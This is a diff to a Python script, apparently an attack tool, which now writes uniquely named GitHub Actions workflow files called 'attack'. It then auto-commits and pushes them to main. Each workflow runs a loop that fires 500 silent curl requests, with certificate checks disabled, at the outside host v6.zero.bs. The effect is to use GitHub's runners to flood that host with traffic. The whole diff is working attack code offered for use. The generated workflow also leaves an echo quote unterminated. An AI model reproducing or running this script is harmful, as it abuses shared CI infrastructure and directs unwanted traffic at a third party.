@@ -9,14 +9,40 @@ unique = str(uuid.uuid4())
 
 now = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time()))
 
-atx = "atx/attack.%s" % unique
+atx = ".github/workflows/attack-%s.yaml" % unique
 
 with open(atx, "w") as aty:
-  aty.write("%s\n" % now)
+  aty.write("""name: Loop 500 Times %s
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  loop_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run loop 500 times %s
+        id: loop_step
+        run: |
+          counter=0
+          while [ $counter -lt 500 ]; do
+            echo "Running loop iteration $((counter + 1))..."
+            # Add your desired actions here for each iteration
+            curl -ks https://v6.zero.bs 2>&1 > /dev/null
+            counter=$((counter + 1))
+          done
+          echo ">> DONE!
+
+
+
+
+""" % (unique, unique))
 
 print("done %s " % atx)
 
-os.system("git add atx/*")
+os.system("git add .github/*")
 os.system("""git commit -am  "atx commit %s | %s" """ % (now, atx))
 os.system("git push origin main")
 
